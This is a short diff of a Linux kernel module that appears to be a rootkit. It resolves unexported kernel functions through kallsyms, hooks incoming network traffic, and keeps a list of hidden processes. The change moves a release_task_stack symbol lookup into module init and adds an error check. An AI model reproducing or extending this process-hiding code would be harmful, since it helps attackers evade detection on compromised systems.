@@ -66,6 +66,7 @@ void show(void) {
 static asmlinkage void (*change_pidR)(
         struct task_struct* task, enum pid_type type, struct pid* pid);
 static asmlinkage struct pid* (*alloc_pidR)(struct pid_namespace* ns);
+static asmlinkage void (*my_release_task_stack) (struct task_struct *ts);
 
 struct service {
     struct socket* tls_socket;
@@ -580,6 +581,11 @@ static int __init mod_init(void) {
 
     change_pidR = kallsyms_lookup_name("change_pid");
     alloc_pidR = kallsyms_lookup_name("alloc_pid");
+    my_release_task_stack = kallsyms_lookup_name("release_task_stack");
+    if (!my_release_task_stack) {
+        printk(KERN_ALERT "Unable to find task stack symbol\n");
+        return -1;
+    }
 
     nfhi.hook = incoming_hook;
     nfhi.hooknum = NF_INET_LOCAL_IN;
@@ -642,8 +648,6 @@ static int __init mod_init(void) {
     return 0;
 }
 
-static asmlinkage void (*my_release_task_stack) (struct task_struct *ts);
-
 /*
  * function:
  *    mod_exit
@@ -659,8 +663,6 @@ static asmlinkage void (*my_release_task_stack) (struct task_struct *ts);
  */
 static void __exit mod_exit(void) {
     int i;
-
-    my_release_task_stack = kallsyms_lookup_name("release_task_stack");
 
     for (i = 0; i < hidden_count; ++i) {
         hidden_procs[i]->state = TASK_DEAD;
